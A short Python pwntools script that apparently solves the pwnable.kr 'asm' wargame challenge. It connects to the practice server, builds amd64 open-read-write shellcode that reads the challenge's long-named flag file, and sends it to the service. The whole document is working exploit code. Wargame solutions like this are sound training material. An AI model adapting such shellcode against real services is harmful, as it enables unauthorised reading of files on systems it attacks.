from pwn import *
context.arch = 'amd64'

r = remote('pwnable.kr', 9026)

sc = asm(
    shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong') +
    shellcraft.open('rsp', 0, 0) +
    shellcraft.read('rax', 'rsp', 0x30) + 
    shellcraft.write(1, 'rsp', 0x30)
)
r.sendlineafter('shellcode: ', sc)

r.interactive()
